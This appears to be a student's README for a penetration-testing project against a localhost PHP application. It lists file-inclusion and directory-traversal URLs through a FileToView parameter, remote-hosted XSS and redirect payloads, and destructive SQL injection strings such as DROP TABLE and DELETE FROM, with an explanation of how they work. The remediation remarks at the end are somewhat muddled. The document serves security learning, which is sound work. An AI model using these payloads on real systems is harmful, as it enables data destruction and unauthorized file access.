# Penetration Testing Main Project
I will host all payloads useed to execute penetration testing tests against the localhost web application.

## Auth2.php

### Directory Traversal: 
```
http://localhost/Project23/auth2.php?FileToView=css/style.css
```

### File Inclusion:
```
http://localhost/Project23/auth2.php?FileToView=index.php
```

### XSS Reflective:
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-xss/main/Lab11-fixed.php
```

<br/>
I was able to host my old assignment on Github and reference the public-hosted .PHP source page via the same ```FileToView``` parameter used to read the ```yellow.txt```file stored in the same directory. The ```FileToView``` attribute doesn't just allow for reflective cross-site scripting, but you can see I am able to do directory traversal to the ```css``` directory as well as reading sensitive data from files such as SQL database which is also located in the same directory:
<br/>

![hosted](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/68013c1a-6a7f-4032-b1e3-2fb508263cef)

### Accessing unsecured Admin Portal (Redirects and Forwards):
```
http://localhost/Project23/auth2.php?FileToView=https://raw.githubusercontent.com/nigeldouglas-itcarlow/pentesting-mainproject/main/redirect-admin-portal.js
```

## Register.php
This is the signup page - ```http://localhost/Project23/register.php```

### SQL Injection
This query includes the commented noise ```--AbC1xyz```, which meets the specified criteria of being at least 8 characters long, containing a mix of uppercase and lowercase letters, and including a digit for the password sanitation. The commented noise itself will not affect the execution of the SQL query but adds some complexity to the string. I do not want the noise to affect the SQL query should ultimately achieves SQL Injection. Here's a breakdown of the query: <br/>

```
'; DROP TABLE loginevents; --AbC1xyz'
```

1. ```';``` This part closes the original SQL statement (if any) and starts a new one. <br/>
2. ```DROP TABLE loginevents;``` This is a SQL command that deletes the specified table (```loginevents``` in this case) from the database. <br/>
3. ```--``` This is a SQL comment that comments out the rest of the original query. It helps to avoid syntax errors that might occur due to the injection.

```
'; DELETE FROM loginevents; --AbC1xyz'
```

```
'; DELETE FROM sapusers; --AbC1xyz'
```

In either case, a ```password_hash``` is used to securely hash the user's password before storing it in the database. <br/>
Additionally, a prepared statement is used to prevent SQL injection. Always hash passwords and avoid inserting user input directly into SQL queries.

![sql](https://github.com/nigeldouglas-itcarlow/pentesting-mainproject/assets/126002808/2cfabb27-2b60-4529-b22a-ad9e7bf16377)

It's still concerning if the input is being directly stored in the SQL database without proper sanitation, as it could lead to SQL injection vulnerabilities. <br/>
To avoid this, we should always use parameterized queries or prepared statements to handle user input in SQL queries.
